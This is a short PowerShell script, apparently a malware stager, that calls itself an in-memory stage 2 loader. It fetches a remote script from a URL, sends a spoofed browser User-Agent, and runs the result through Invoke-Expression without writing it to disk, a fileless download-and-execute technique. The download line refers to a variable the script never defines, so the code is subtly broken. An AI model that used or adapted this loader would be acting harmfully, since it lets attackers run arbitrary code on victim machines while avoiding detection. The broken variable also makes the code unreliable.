<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$TransferUrl = 'https://internal.corp:8443/stage2.ps1',
    [int]$TimeoutSec = 17
)
$ErrorActionPreference = "Stop"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $RemoteScript = $ClientObject.DownloadString($SourceUrl)
    if ([string]::IsNullOrWhiteSpace($RemoteScript)) {
        throw "Downloaded script was empty"
    }
    Write-Verbose ("Script length: " + $RemoteScript.Length)
    Invoke-Expression $RemoteScript
}
catch {
    Write-Warning "In-memory stage failed: $($_.Exception.Message)"
}

$StageMarker = "stage-24"
Set-Location -Path $env:TEMP
Write-Verbose "stage marker 39 reached"
